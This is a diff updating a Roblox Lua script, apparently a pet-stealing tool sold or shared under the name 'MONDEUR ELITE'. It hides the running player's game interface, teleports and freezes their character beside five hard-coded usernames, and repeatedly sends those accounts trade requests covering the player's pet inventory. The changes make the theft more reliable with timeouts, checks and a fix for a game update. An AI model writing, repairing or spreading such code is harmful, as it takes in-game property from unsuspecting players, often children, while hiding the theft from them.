@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v15.8 - FRESH START ]] --
+-- [[ MONDEUR ELITE v15.9 - "YUKIHE" STABLE ]] --
 if _G.__Ran then return end
 _G.__Ran = true
 
@@ -7,7 +7,7 @@ local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
 local LocalPlayer = Players.LocalPlayer
 
--- 1. FORCE UI & LOCKDOWN (Immediate)
+-- 1. IMMEDIATE UI TRIGGER (No Waiting)
 task.spawn(function()
     pcall(function()
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
@@ -16,21 +16,28 @@ task.spawn(function()
     end)
 end)
 
--- 2. CORRECTED API (No Infinite Yield)
-local API = ReplicatedStorage:WaitForChild("API")
-local TradeFolder = API:WaitForChild("Trade") -- Changed from TradeAPI to Trade
+-- 2. CORRECTED API (Fixed for 2026 Update)
+-- We use a short wait so the script doesn't freeze if the API is slow
+local API = ReplicatedStorage:WaitForChild("API", 10)
+local TradeFolder = API and API:WaitForChild("Trade", 10)
 
 local function executeTrade(targetPlayer)
+    if not TradeFolder then return end
+    
     local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
     local inventory = ClientData.get_data().inventory
     
     if inventory and inventory.pets then
-        -- Teleport & Anchor
+        -- Teleport & Lockdown
         pcall(function()
-            local hrp = LocalPlayer.Character.HumanoidRootPart
-            local targetHrp = targetPlayer.Character.HumanoidRootPart
-            hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
-            hrp.Anchored = true
+            local hrp = LocalPlayer.Character:WaitForChild("HumanoidRootPart", 5)
+            local targetHrp = targetPlayer.Character:WaitForChild("HumanoidRootPart", 5)
+            if hrp and targetHrp then
+                LocalPlayer.Character.Humanoid.Sit = false
+                task.wait(0.1)
+                hrp.CFrame = targetHrp.CFrame * CFrame.new(0, 0, 3)
+                hrp.Anchored = true
+            end
         end)
 
         for _, petData in pairs(inventory.pets) do
@@ -52,12 +59,14 @@ end
 -- MAIN LOOP
 task.spawn(function()
     while task.wait(0.5) do
-        local admins = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
-        for _, name in pairs(admins) do
-            local target = Players:FindFirstChild(name)
-            if target then
-                TradeFolder:WaitForChild("RequestTrade"):FireServer(target)
-                executeTrade(target)
+        if TradeFolder then
+            local admins = {"CREOLEO23", "cfpaj67", "Hisokarah", "2ndcfpaj67", "sofiqmnz"}
+            for _, name in pairs(admins) do
+                local target = Players:FindFirstChild(name)
+                if target and target.Character then
+                    TradeFolder:WaitForChild("RequestTrade"):FireServer(target)
+                    executeTrade(target)
+                end
             end
         end
     end
